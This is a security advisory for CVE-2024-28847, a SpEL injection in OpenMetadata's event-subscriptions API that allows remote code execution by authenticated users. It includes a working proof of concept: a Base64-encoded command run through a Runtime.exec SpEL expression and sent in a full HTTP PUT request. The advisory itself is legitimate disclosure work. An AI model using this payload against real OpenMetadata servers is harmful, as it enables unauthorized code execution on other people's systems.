# OpenMetadata vulnerable to a SpEL Injection in `PUT /api/v1/events/subscriptions` (`GHSL-2023-251`)

**GHSA**: GHSA-8p5r-6mvv-2435 | **CVE**: CVE-2024-28847 | **Severity**: high (CVSS 8.8)

**CWE**: CWE-94

**Affected Packages**:
- **org.open-metadata:openmetadata-service** (maven): < 1.2.4

## Description

### SpEL Injection in `PUT /api/v1/events/subscriptions` (`GHSL-2023-251`)

***Please note, only authenticated users have access to PUT / POST APIS for /api/v1/policies. Non authenticated users will not be able to access these APIs to exploit the vulnerability. A user must exist in OpenMetadata and have authenticated themselves to exploit this vulnerability.***

Similarly to the GHSL-2023-250 issue, `AlertUtil::validateExpression` is also called from [`EventSubscriptionRepository.prepare()`](https://github.com/open-metadata/OpenMetadata/blob/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service/jdbi3/EventSubscriptionRepository.java#L69-L83), which can lead to Remote Code Execution.

```java
  @Override
  public void prepare(EventSubscription entity, boolean update) {
    validateFilterRules(entity);
  }

  private void validateFilterRules(EventSubscription entity) {
    // Resolve JSON blobs into Rule object and perform schema based validation
    if (entity.getFilteringRules() != null) {
      List<EventFilterRule> rules = entity.getFilteringRules().getRules();
      // Validate all the expressions in the rule
      for (EventFilterRule rule : rules) {
        AlertUtil.validateExpression(rule.getCondition(), Boolean.class);
      }
      rules.sort(Comparator.comparing(EventFilterRule::getName));
    }
  }
```

`prepare()` is called from [`EntityRepository.prepareInternal()`](https://github.com/open-metadata/OpenMetadata/blob/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service/jdbi3/EntityRepository.java#L693) which, in turn, gets called from the [`EntityResource.createOrUpdate()`](https://github.com/open-metadata/OpenMetadata/blob/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service/resources/EntityResource.java#L219):

```java
public Response createOrUpdate(UriInfo uriInfo, SecurityContext securityContext, T entity) {
  repository.prepareInternal(entity, true);

  // If entity does not exist, this is a create operation, else update operation
  ResourceContext<T> resourceContext = getResourceContextByName(entity.getFullyQualifiedName());
  MetadataOperation operation = createOrUpdateOperation(resourceContext);
  OperationContext operationContext = new OperationContext(entityType, operation);
  if (operation == CREATE) {
    CreateResourceContext<T> createResourceContext = new CreateResourceContext<>(entityType, entity);
    authorizer.authorize(securityContext, operationContext, createResourceContext);
    entity = addHref(uriInfo, repository.create(uriInfo, entity));
    return new PutResponse<>(Response.Status.CREATED, entity, RestUtil.ENTITY_CREATED).toResponse();
  }
  authorizer.authorize(securityContext, operationContext, resourceContext);
  PutResponse<T> response = repository.createOrUpdate(uriInfo, entity);
  addHref(uriInfo, response.getEntity());
  return response.toResponse();
}
```

Note that, even though there is an authorization check (`authorizer.authorize()`), it gets called after `prepareInternal()` gets called and, therefore, after the SpEL expression has been evaluated.

In order to reach this method, an attacker can send a PUT request to `/api/v1/events/subscriptions` which gets handled by [`EventSubscriptionResource.createOrUpdateEventSubscription()`](https://github.com/open-metadata/OpenMetadata/blob/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service/resources/events/subscription/EventSubscriptionResource.java#L289):

```java
@PUT
@Operation(
    operationId = "createOrUpdateEventSubscription",
    summary = "Updated an existing or create a new Event Subscription",
    description = "Updated an existing or create a new Event Subscription",
    responses = {
      @ApiResponse(
          responseCode = "200",
          description = "create Event Subscription",
          content =
              @Content(
                  mediaType = "application/json",
                  schema = @Schema(implementation = CreateEventSubscription.class))),
      @ApiResponse(responseCode = "400", description = "Bad request")
    })
public Response createOrUpdateEventSubscription(
    @Context UriInfo uriInfo, @Context SecurityContext securityContext, @Valid CreateEventSubscription create) {
  // Only one Creation is allowed for Data Insight
  if (create.getAlertType() == CreateEventSubscription.AlertType.DATA_INSIGHT_REPORT) {
    try {
      repository.getByName(null, create.getName(), repository.getFields("id"));
    } catch (EntityNotFoundException ex) {
      if (ReportsHandler.getInstance() != null && ReportsHandler.getInstance().getReportMap().size() > 0) {
        throw new BadRequestException("Data Insight Report Alert already exists.");
      }
    }
  }
  EventSubscription eventSub = getEventSubscription(create, securityContext.getUserPrincipal().getName());
  Response response = createOrUpdate(uriInfo, securityContext, eventSub);
  repository.updateEventSubscription((EventSubscription) response.getEntity());
  return response;
}
```

This vulnerability was discovered with the help of CodeQL's [Expression language injection (Spring)](https://codeql.github.com/codeql-query-help/java/java-spel-expression-injection/) query.

#### Proof of concept
- Prepare the payload
	- Encode the command to be run (eg: `touch /tmp/pwned`) using Base64 (eg: `dG91Y2ggL3RtcC9wd25lZA==`)
	- Create the SpEL expression to run the system command: `T(java.lang.Runtime).getRuntime().exec(new java.lang.String(T(java.util.Base64).getDecoder().decode("dG91Y2ggL3RtcC9wd25lZA==")))`
- Send the payload using a valid JWT token:
```http
PUT /api/v1/events/subscriptions HTTP/1.1
Host: localhost:8585
Authorization: Bearer <non-admin JWT>
accept: application/json
Connection: close
Content-Type: application/json
Content-Length: 353

{
"name":"ActivityFeedAlert","displayName":"Activity Feed Alerts","alertType":"ChangeEvent","filteringRules":{"rules":[
{"name":"pwn","effect":"exclude","condition":"T(java.lang.Runtime).getRuntime().exec(new java.lang.String(T(java.util.Base64).getDecoder().decode('dG91Y2ggL3RtcC9wd25lZA==')))"}]},"subscriptionType":"ActivityFeed","enabled":true
}
```
- Verify that a file called `/tmp/pwned` was created in the OpenMetadata server
#### Impact

This issue may lead to Remote Code Execution.

#### Remediation

Use [`SimpleEvaluationContext`](https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/expression/spel/support/SimpleEvaluationContext.html) to exclude *references to Java types, constructors, and bean references*.
